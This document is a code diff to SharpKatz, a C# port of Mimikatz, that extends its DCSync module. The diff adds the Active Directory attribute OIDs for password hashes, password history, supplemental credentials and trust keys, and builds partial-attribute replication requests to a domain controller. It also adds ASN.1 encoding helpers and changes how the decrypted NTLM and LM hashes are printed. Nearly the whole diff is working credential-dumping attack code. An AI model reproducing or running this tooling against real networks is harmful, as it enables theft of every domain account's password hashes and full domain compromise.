@@ -34,6 +34,32 @@ namespace SharpKatz.Module
 
         const int SECPKG_ATTR_SESSION_KEY = 9;
 
+        const string szOID_ANSI_name = "1.2.840.113556.1.4.1";
+        const string szOID_objectGUID = "1.2.840.113556.1.4.2";
+
+        const string szOID_ANSI_sAMAccountName = "1.2.840.113556.1.4.221";
+        const string szOID_ANSI_userPrincipalName = "1.2.840.113556.1.4.656";
+        const string szOID_ANSI_servicePrincipalName = "1.2.840.113556.1.4.771";
+        const string szOID_ANSI_sAMAccountType = "1.2.840.113556.1.4.302";
+        const string szOID_ANSI_userAccountControl = "1.2.840.113556.1.4.8";
+        const string szOID_ANSI_accountExpires = "1.2.840.113556.1.4.159";
+        const string szOID_ANSI_pwdLastSet = "1.2.840.113556.1.4.96";
+        const string szOID_ANSI_objectSid = "1.2.840.113556.1.4.146";
+        const string szOID_ANSI_sIDHistory = "1.2.840.113556.1.4.609";
+        const string szOID_ANSI_unicodePwd = "1.2.840.113556.1.4.90";
+        const string szOID_ANSI_ntPwdHistory = "1.2.840.113556.1.4.94";
+        const string szOID_ANSI_dBCSPwd = "1.2.840.113556.1.4.55";
+        const string szOID_ANSI_lmPwdHistory = "1.2.840.113556.1.4.160";
+        const string szOID_ANSI_supplementalCredentials = "1.2.840.113556.1.4.125";
+
+        const string szOID_ANSI_trustPartner = "1.2.840.113556.1.4.133";
+        const string szOID_ANSI_trustAuthIncoming = "1.2.840.113556.1.4.129";
+        const string szOID_ANSI_trustAuthOutgoing = "1.2.840.113556.1.4.135";
+
+        const string szOID_ANSI_currentValue = "1.2.840.113556.1.4.27";
+
+        const string szOID_isDeleted = "1.2.840.113556.1.2.48";
+
         static GCHandle procString;
         static GCHandle formatString;
         static GCHandle stub;
@@ -128,6 +154,24 @@ namespace SharpKatz.Module
                 0x5c, 0x5b, 0x11, 0x04, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x54, 0x18, 0x00, 0x01, 0x00, 0x02, 0x00, 0x28, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x82, 0xfc, 0xff, 0xff, 0x00
             };
 
+        static string[] kuhl_m_lsadump_dcsync_oids = {
+    szOID_ANSI_name,
+    szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
+    szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
+    szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
+    szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
+    szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
+    szOID_ANSI_currentValue,
+    szOID_isDeleted
+};
+        static string[] kuhl_m_lsadump_dcsync_oids_export = {
+    szOID_ANSI_name,
+    szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
+    szOID_ANSI_userAccountControl,
+    szOID_ANSI_unicodePwd,
+    szOID_isDeleted
+};
+
         private static byte[] SessionKey;
         static SecurityCallbackDelegate rpcSecurityCallbackDelegate;
         private delegate void SecurityCallbackDelegate(IntPtr context);
@@ -148,6 +192,8 @@ namespace SharpKatz.Module
             DRS_MSG_GETCHGREPLY_V6 mSG_GETCHGREPLY;
             IntPtr hDrs;
             DRS_EXTENSIONS_INT extensions;
+
+            kull_m_asn1_init();
 
             hBinding = CreateBinding(dc, altservice);
 
@@ -188,6 +234,9 @@ namespace SharpKatz.Module
                     }
                 }
             }
+
+            kull_m_asn1_term();
+
             return true;
         }
 
@@ -200,13 +249,250 @@ namespace SharpKatz.Module
             Marshal.StructureToPtr(dsname, pdsName, true);
             mSG_GETCHGREQ.pNC = pdsName;
             mSG_GETCHGREQ.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
-            mSG_GETCHGREQ.cMaxObjects = (uint)((alldata) ? 1000 : 1);
+            mSG_GETCHGREQ.cMaxObjects = (uint)((alldata) ? 50 : 1);
             mSG_GETCHGREQ.cMaxBytes = 0x00a00000; // 10M
             mSG_GETCHGREQ.ulExtendedOp = (uint)((alldata) ? 0 : 6);
+
+
+
+            PARTIAL_ATTR_VECTOR_V1_EXT edr = new PARTIAL_ATTR_VECTOR_V1_EXT();
+            mSG_GETCHGREQ.PrefixTableDest = new SCHEMA_PREFIX_TABLE();
+            edr.dwVersion = 1;
+            edr.dwReserved1 = 0;
+
+            if (alldata)
+            {
+                edr.cAttrs = (uint)kuhl_m_lsadump_dcsync_oids_export.Length;
+                edr.rgPartialAttr = new uint[kuhl_m_lsadump_dcsync_oids.Length];
+
+                for (int i = 0; i < edr.cAttrs; i++)
+                    DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], ref edr.rgPartialAttr[i]);
+            }
+            else
+            {
+                edr.cAttrs = (uint)kuhl_m_lsadump_dcsync_oids.Length;
+                edr.rgPartialAttr = new uint[kuhl_m_lsadump_dcsync_oids.Length];
+                for (int i = 0; i < edr.cAttrs; i++)
+                    DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], ref edr.rgPartialAttr[i]);
+            }
+
+            mSG_GETCHGREQ.pPartialAttrSet = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PARTIAL_ATTR_VECTOR_V1_EXT)));
+            Marshal.StructureToPtr(edr, mSG_GETCHGREQ.pPartialAttrSet, false);
 
             IntPtr result = NdrClientCall2_5(GetStubPtr(4, 0), GetProcStringPtr(134), hDrs, 8, mSG_GETCHGREQ, ref dwOutVersion, ref mSG_GETCHGREPLY);
 
             return (int)result.ToInt64();
+        }
+
+        private static void DrsrMakeAttid(ref SCHEMA_PREFIX_TABLE prefixTable, string szOid, ref uint att)
+        {
+            uint lastValue;
+            uint ndx = 0;
+            string lastValueString;
+            OssEncodedOID oidPrefix;
+
+            try
+            {
+                lastValueString = szOid.Substring(szOid.LastIndexOf(".") + 1);
+                lastValue = UInt32.Parse(lastValueString);
+
+                att = (ushort)(lastValue % 0x4000);
+                if (att >= 0x4000)
+                    att += 0x8000;
+
+                if (DotVal2Eoid(szOid, out oidPrefix))
+                {
+                    oidPrefix.length -= (ushort)((lastValue < 0x80) ? 1 : 2);
+
+                    if (DrsrMakeAttidAddPrefixToTable(ref prefixTable, ref oidPrefix, ref ndx))
+                        att = (ushort)(att | ndx << 16);
+                    else
+                        Console.WriteLine("DrsrMakeAttidAddPrefixToTable");
+                }
+                else
+                    Console.WriteLine("DotVal2Eoid");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("DrsrMakeAttidAddPrefixToTable " + e.Message);
+                Console.WriteLine("DrsrMakeAttidAddPrefixToTable " + e.StackTrace);
+            }
+        }
+
+        private static void FreeEnc(IntPtr pBuf)
+        {
+            if (!ASN1enc.Equals(default(ASN1encoding_s)) && pBuf != IntPtr.Zero)
+                ASN1_FreeEncoded(ref ASN1enc, pBuf);
+        }
+
+        private static bool DotVal2Eoid(string dotOID, out OssEncodedOID encodedOID)
+        {
+
+            bool status = false;
+            encodedOID = new OssEncodedOID();
+            if (!ASN1enc.Equals(default(ASN1encoding_s)) && !string.IsNullOrEmpty(dotOID))
+            {
+                encodedOID.length = 0;
+                encodedOID.value = IntPtr.Zero;
+
+                IntPtr mt = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ASN1encoding_s)));
+                Marshal.StructureToPtr(ASN1enc, mt, false);
+
+                IntPtr ot = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(OssEncodedOID)));
+                Marshal.StructureToPtr(encodedOID, ot, false);
+
+                status = ASN1BERDotVal2Eoid(mt, dotOID, ot);
+
+
+
+                encodedOID = (OssEncodedOID)Marshal.PtrToStructure(ot, typeof(OssEncodedOID));
+
+                //Console.WriteLine("dotOID " + dotOID);
+                //Console.WriteLine("Marshal.PtrToStringAnsi(encodedOID.value) " + Marshal.PtrToStringAnsi(encodedOID.value));
+                //Console.WriteLine("Marshal.ReadUInt32(encodedOID.value,8) " + (UInt64)Marshal.ReadInt64(encodedOID.value));
+            }
+            return status;
+        }
+
+        private static bool DrsrMakeAttidAddPrefixToTable(ref SCHEMA_PREFIX_TABLE prefixTable, ref OssEncodedOID oidPrefix, ref uint ndx)
+        {
+            bool status = false;
+            IntPtr entries;
+
+            /*for (int i = 0; i < prefixTable.PrefixCount; i++)
+            {
+                if (prefixTable.pPrefixEntry[i].prefix.length == oidPrefix.length)
+                {
+                    if (EqualMemory(prefixTable.pPrefixEntry[i].prefix.elements, oidPrefix.value, oidPrefix.length))
+                    {
+                        status = true;
+                        ndx = prefixTable.pPrefixEntry[i].ndx;
+                        break;
+                    }
+                }
+            }*/
+
+            if (!status)
+            {
+                ndx = prefixTable.PrefixCount;
+
+                entries = Marshal.AllocHGlobal((int)(Marshal.SizeOf(typeof(PrefixTableEntry)) * (ndx + 1)));
+                int size = Marshal.SizeOf(typeof(PrefixTableEntry));
+                if (prefixTable.pPrefixEntry != null)
+                {
+                    for (int i = 0; i < ndx; i++)
+                    {
+                        PrefixTableEntry entry = (PrefixTableEntry)Marshal.PtrToStructure(IntPtr.Add(prefixTable.pPrefixEntry, i * size), typeof(PrefixTableEntry));
+                        Marshal.StructureToPtr(entry, IntPtr.Add(entries, i * size), false);
+                    }
+                }
+
+                PrefixTableEntry newentry = new PrefixTableEntry();
+                newentry.ndx = ndx;
+                newentry.prefix.length = oidPrefix.length;
+
+                newentry.prefix.elements = Marshal.AllocHGlobal(oidPrefix.length);
+
+
+                if (CopyMemory(oidPrefix.value, newentry.prefix.elements, oidPrefix.length))
+                {
+                    Marshal.StructureToPtr(newentry, IntPtr.Add(entries, (int)ndx * size), false);
+                    prefixTable.pPrefixEntry = entries;
+                    prefixTable.PrefixCount = prefixTable.PrefixCount + 1;
+                    status = true;
+                }
+
+            }
+
+            return status;
+        }
+
+        private static bool EqualMemory(IntPtr ptr1, IntPtr ptr2, int length)
+        {
+            for (int i = 0; i < length; i++)
+            {
+                if (Marshal.ReadByte(ptr1, i) != Marshal.ReadByte(ptr2, i))
+                {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        private static bool CopyMemory(IntPtr src, IntPtr dest, int length)
+        {
+
+            try
+            {
+                byte[] tmpbyte = new byte[length];
+                Marshal.Copy(src, tmpbyte, 0, length);
+                Marshal.Copy(tmpbyte, 0, dest, length);
+            }
+            catch (Exception)
+            {
+                Console.WriteLine("Error Copy");
+                return false;
+            }
+            return true;
+        }
+
+        static IntPtr hASN1Module = IntPtr.Zero;
+        static ASN1encoding_s ASN1enc;
+        static ASN1decoding_s ASN1dec;
+
+        static IntPtr[] kull_m_asn1_encdecfreefntab = { IntPtr.Zero };
+        static int[] kull_m_asn1_sizetab = { 0 };
+
+        public static bool kull_m_asn1_init()
+        {
+            bool status = false;
+            ASN1error_e ret;
+
+            hASN1Module = ASN1_CreateModule((((1) << 16) | (0)), 1024, 4096, 1, kull_m_asn1_encdecfreefntab, kull_m_asn1_encdecfreefntab, kull_m_asn1_encdecfreefntab, kull_m_asn1_sizetab, (uint)1769433451);
+            if (hASN1Module != IntPtr.Zero)
+            {
+                IntPtr s = IntPtr.Zero;
+
+                IntPtr mt = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ASN1encoding_s)));
+                Marshal.StructureToPtr(ASN1enc, mt, false);
+                ret = ASN1_CreateDecoder(hASN1Module, out mt, IntPtr.Zero, 0, s);
+                ASN1enc = (ASN1encoding_s)Marshal.PtrToStructure(mt, typeof(ASN1encoding_s));
+
+                if (ret < 0)
+                {
+                    Console.WriteLine("ASN1_CreateEncoder: {0}", ret);
+                    ASN1enc = new ASN1encoding_s();
+                }
+                else
+                {
+                    IntPtr d = new IntPtr();
+                    IntPtr mt2 = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ASN1decoding_s)));
+                    Marshal.StructureToPtr(ASN1dec, mt2, false);
+                    ret = ASN1_CreateDecoder(hASN1Module, out mt2, IntPtr.Zero, 0, d);
+                    ASN1dec = (ASN1decoding_s)Marshal.PtrToStructure(mt2, typeof(ASN1decoding_s));
+                    if (ret < 0)
+                    {
+                        Console.WriteLine("ASN1_CreateDecoder: {0}", ret);
+                        ASN1dec = new ASN1decoding_s();
+                    }
+                }
+            }
+            else
+                Console.WriteLine("ASN1_CreateModule");
+
+            status = (hASN1Module != IntPtr.Zero) && !ASN1enc.Equals(default(ASN1encoding_s)) && !ASN1dec.Equals(default(ASN1decoding_s));
+            if (!status)
+                kull_m_asn1_term();
+
+            return status;
+        }
+
+        public static void kull_m_asn1_term()
+        {
+            if (hASN1Module != IntPtr.Zero)
+            {
+                ASN1_CloseModule(hASN1Module);
+            }
         }
 
         private static IntPtr CreateBinding(string dc, string altservice)
@@ -537,6 +823,8 @@ namespace SharpKatz.Module
             uint numObjects = pmsgOut.cNumObjects;
             replicationData = new Dictionary<int, object>();
             REPLENTINFLIST list = (REPLENTINFLIST)Marshal.PtrToStructure(pObjects, typeof(REPLENTINFLIST));
+            REPLENTINFLIST current = list;
+
             do
             {
                 int size = Marshal.SizeOf(typeof(ATTR));
@@ -550,7 +838,7 @@ namespace SharpKatz.Module
                         ATTRVAL attrval = (ATTRVAL)Marshal.PtrToStructure(IntPtr.Add(attr.AttrVal.pAVal, (int)(j * sizeval)), typeof(ATTRVAL));
                         byte[] data = new byte[attrval.valLen];
                         Marshal.Copy(attrval.pVal, data, 0, (int)attrval.valLen);
-
+                        
                         switch ((ATT)attr.attrTyp)
                         {
                             //case ATT.ATT_CURRENT_VALUE:
@@ -577,9 +865,13 @@ namespace SharpKatz.Module
                         replicationData[(int)attr.attrTyp] = values;
                     }
                 }
-                if(list.pNextEntInf != IntPtr.Zero)
+
+                if (list.pNextEntInf != IntPtr.Zero)
                     list = (REPLENTINFLIST)Marshal.PtrToStructure(list.pNextEntInf, typeof(REPLENTINFLIST));
-            } while (list.pNextEntInf != IntPtr.Zero);
+                else
+                    break;
+
+            } while (true);
         }
 
 
@@ -694,6 +986,7 @@ namespace SharpKatz.Module
         private static void DecodeReplicationFields(Dictionary<int, object> ReplicationData, out Dictionary<string, object> DecodedReplicationData)
         {
             DecodedReplicationData = new Dictionary<string, object>();
+
             foreach (ATT att in Enum.GetValues(typeof(ATT)))
             {
                 if (ReplicationData.ContainsKey((int)att))
@@ -717,65 +1010,67 @@ namespace SharpKatz.Module
 
         private static void DecodeData(byte[] data, ATT att, Dictionary<int, object> ReplicationData, Dictionary<string, object> DecodedReplicationData)
         {
-            switch (att)
+            if (data != null)
             {
-                case ATT.ATT_WHEN_CREATED:
-                case ATT.ATT_WHEN_CHANGED:
-                    //    var test = BitConverter.ToInt64(data, 0);    
-                    //string stringdate = UnicodeEncoding.Default.GetString(data);
-                    //    DateTime d = DateTime.ParseExact(stringdate, "yyyyMMddHHmmss.f'Z'", CultureInfo.InvariantCulture);
-                    //    DecodedReplicationData.Add(att.ToString(), d);
-                    break;
-                case ATT.ATT_LAST_LOGON:
-                case ATT.ATT_PWD_LAST_SET:
-                case ATT.ATT_ACCOUNT_EXPIRES:
-                case ATT.ATT_LOCKOUT_TIME:
-                    Int64 intdate = BitConverter.ToInt64(data, 0);
-                    DateTime datetime;
-                    if (intdate == Int64.MaxValue)
-                    {
-                        datetime = DateTime.MaxValue;
-                    }
-                    else
-                    {
-                        datetime = DateTime.FromFileTime(intdate);
-                    }
-                    DecodedReplicationData.Add(att.ToString(), datetime);
-                    break;
-                case ATT.ATT_RDN:
-                case ATT.ATT_SAM_ACCOUNT_NAME:
-                case ATT.ATT_USER_PRINCIPAL_NAME:
-                case ATT.ATT_SERVICE_PRINCIPAL_NAME:
-                    DecodedReplicationData.Add(att.ToString(), Encoding.Unicode.GetString(data));
-                    break;
-                case ATT.ATT_LOGON_WORKSTATION:
-                    break;
+                switch (att)
+                {
+                    case ATT.ATT_WHEN_CREATED:
+                    case ATT.ATT_WHEN_CHANGED:
+                        //    var test = BitConverter.ToInt64(data, 0);    
+                        //string stringdate = UnicodeEncoding.Default.GetString(data);
+                        //    DateTime d = DateTime.ParseExact(stringdate, "yyyyMMddHHmmss.f'Z'", CultureInfo.InvariantCulture);
+                        //    DecodedReplicationData.Add(att.ToString(), d);
+                        break;
+                    case ATT.ATT_LAST_LOGON:
+                    case ATT.ATT_PWD_LAST_SET:
+                    case ATT.ATT_ACCOUNT_EXPIRES:
+                    case ATT.ATT_LOCKOUT_TIME:
+                        Int64 intdate = BitConverter.ToInt64(data, 0);
+                        DateTime datetime;
+                        if (intdate == Int64.MaxValue)
+                        {
+                            datetime = DateTime.MaxValue;
+                        }
+                        else
+                        {
+                            datetime = DateTime.FromFileTime(intdate);
+                        }
+                        DecodedReplicationData.Add(att.ToString(), datetime);
+                        break;
+                    case ATT.ATT_RDN:
+                    case ATT.ATT_SAM_ACCOUNT_NAME:
+                    case ATT.ATT_USER_PRINCIPAL_NAME:
+                    case ATT.ATT_SERVICE_PRINCIPAL_NAME:
+                        DecodedReplicationData.Add(att.ToString(), Encoding.Unicode.GetString(data));
+                        break;
+                    case ATT.ATT_LOGON_WORKSTATION:
+                        break;
 
-                case ATT.ATT_USER_ACCOUNT_CONTROL:
-                    DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
-                    break;
-                case ATT.ATT_SAM_ACCOUNT_TYPE:
-                    DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
-                    break;
-
-                case ATT.ATT_UNICODE_PWD:
-                case ATT.ATT_NT_PWD_HISTORY:
-                case ATT.ATT_DBCS_PWD:
-                case ATT.ATT_LM_PWD_HISTORY:
-                    byte[] decrypted = DecryptHashUsingSID(data, ReplicationData[(int)ATT.ATT_OBJECT_SID] as byte[]);
-                    DecodedReplicationData.Add(att.ToString(), decrypted);
-                    break;
-                case ATT.ATT_SID_HISTORY:
-                case ATT.ATT_OBJECT_SID:
-                    DecodedReplicationData.Add(att.ToString(), new SecurityIdentifier(data, 0));
-                    break;
-                case ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
-                    DecodedReplicationData.Add(att.ToString(), data);
-                    break;
-                case ATT.ATT_LOGON_HOURS:
-                default:
-                    DecodedReplicationData.Add(att.ToString(), data.ToString());
-                    break;
+                    case ATT.ATT_USER_ACCOUNT_CONTROL:
+                        DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
+                        break;
+                    case ATT.ATT_SAM_ACCOUNT_TYPE:
+                        DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
+                        break;
+                    case ATT.ATT_UNICODE_PWD:
+                    case ATT.ATT_NT_PWD_HISTORY:
+                    case ATT.ATT_DBCS_PWD:
+                    case ATT.ATT_LM_PWD_HISTORY:
+                        byte[] decrypted = DecryptHashUsingSID(data, ReplicationData[(int)ATT.ATT_OBJECT_SID] as byte[]);
+                        DecodedReplicationData.Add(att.ToString(), decrypted);
+                        break;
+                    case ATT.ATT_SID_HISTORY:
+                    case ATT.ATT_OBJECT_SID:
+                        DecodedReplicationData.Add(att.ToString(), new SecurityIdentifier(data, 0));
+                        break;
+                    case ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
+                        DecodedReplicationData.Add(att.ToString(), data);
+                        break;
+                    case ATT.ATT_LOGON_HOURS:
+                    default:
+                        DecodedReplicationData.Add(att.ToString(), data.ToString());
+                        break;
+                }
             }
         }
 
@@ -847,13 +1142,29 @@ namespace SharpKatz.Module
                     Console.WriteLine("[*] Object Relative ID   : {0}", rid);
                 }
             }
+            Console.WriteLine("[*]");
 
-            Console.WriteLine("[*]");
-            Console.WriteLine("[*] Credentials:");
-            Console.WriteLine("[*] Hash NTLM            : {0}", Utility.PrintHashBytes((byte[])unicodePwd));
-            Console.WriteLine("[*] ntlm- 0              : {0}", Utility.PrintHashBytes((byte[])ntPwdHistory));
-            Console.WriteLine("[*] lm  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwd));
-            Console.WriteLine("[*]");
+            if(ntPwdHistory != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
+            {
+                Console.WriteLine("[*] Credentials:");
+                if (ntPwdHistory != null)
+                {
+                    Console.WriteLine("[*] Hash NTLM            : {0}", Utility.PrintHashBytes((byte[])unicodePwd));
+                }
+                if (ntPwdHistory != null)
+                {
+                    Console.WriteLine("[*] ntlm- 0              : {0}", Utility.PrintHashBytes((byte[])ntPwdHistory));
+                }
+                if (lmPwd != null)
+                {
+                    Console.WriteLine("[*] LM  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwd));
+                }
+                if (lmPwdHistory != null)
+                {
+                    Console.WriteLine("[*] lm  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwdHistory));
+                }
+                Console.WriteLine("[*]");
+            }
 
             int offsetConunt = Utility.FieldOffset<USER_PROPERTIES>("PropertyCount");
             int offsetLenght = Utility.FieldOffset<USER_PROPERTIES>("Length");
